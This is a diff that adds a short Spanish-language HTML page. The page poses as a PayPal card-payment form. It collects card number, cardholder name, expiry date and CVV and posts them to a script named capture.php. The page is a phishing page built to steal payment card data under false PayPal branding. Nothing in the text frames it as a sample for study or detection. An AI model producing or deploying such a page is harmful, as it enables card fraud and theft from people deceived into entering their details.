@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head><title>Pago Seguro - PayPal</title></head>
+<body style="font-family:Arial;text-align:center">
+  <h2>PayPal - Pago con Tarjeta</h2>
+  <form method="post" action="capture.php">
+    <label>Número de Tarjeta:</label><br><input type="text" name="numero"><br><br>
+    <label>Nombre del Titular:</label><br><input type="text" name="titular"><br><br>
+    <label>Fecha de Expiración (MM/AA):</label><br><input type="text" name="exp"><br><br>
+    <label>CVV:</label><br><input type="text" name="cvv"><br><br>
+    <input type="submit" value="Pagar ahora">
+  </form>
+</body>
+</html>
